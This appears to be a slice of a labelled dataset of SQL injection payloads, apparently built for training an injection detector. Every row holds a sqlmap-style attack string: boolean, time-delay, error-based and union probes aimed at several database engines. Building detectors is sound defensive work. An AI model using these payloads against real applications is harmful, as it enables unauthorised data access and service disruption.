row_index,payload_norm,label,sqli_type_hint
8430,"1"" and ( 3020 = 3020 ) *6703 and ""tnzp"" like ""tnzp",1,
8431,"-8875"" ) where 8428 = 8428 or 1519 = 5756--",1,
8432,1 ) ) as xzcl where 2332 = 2332,1,
8433,1' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'rgyc' = 'rgyc,1,
8434,"-5520"" ) ) as utqk where 7762 = 7762 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
8435,"1'|| ( select 'wcad' from dual where 4262 = 4262 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
8436,-9771' or 5113 = 5365,1,
8437,"1', ( select ( case when ( 7734 = 7734 ) then ( select benchmark ( 5000000,md5 ( 0x72747341 ) ) ) else 7734* ( select 7734 from mysql.db ) end ) )",1,
8438,"1', ( select ( case when ( 7711 = 7711 ) then 1 else 7711* ( select 7711 from information_schema.character_sets ) end ) )",1,
8439,"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",1,
8440,-4965 ) as imga where 3705 = 3705 union all select 3705--,1,
8441,"1%' ) union all select null,null,null,null--",1,
8442,"1 ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( 3366 = 3366",1,
8443,"1"" ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""uglh"" like ""uglh",1,
8444,"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",1,
8445,"-2790' ) as xhct where 5756 = 5756 union all select 5756,5756#",1,
8446,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""jwzy"" = ""jwzy",1,
8447,1'|| ( select 'ymre' where 8681 = 8681,1,
8448,1' ) ) and 3526 = 1354,1,
8449,"-5496 union all select 2099,2099,2099#",1,
8450,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""wcze"" = ""wcze",1,
8451,select ( case when ( 8208 = 7960 ) then 8208 else 8208* ( select 8208 from information_schema.character_sets ) end ) #,1,
8452,"-4210"" ) where 2679 = 2679 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",1,
8453,"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # urzg",1,
8454,"1"" ) ) and elt ( 3785 = 9386,9386 ) and ( ( ""inwa"" like ""inwa",1,
8455,"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1,
8456,1 ) ) as vcvn where 2106 = 2106,1,
8457,"-8609' union all select 9384,9384,9384,9384--",1,
8458,"1 where 5332 = 5332 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,
8459,"1"" ) as ivuv where 5691 = 5691",1,
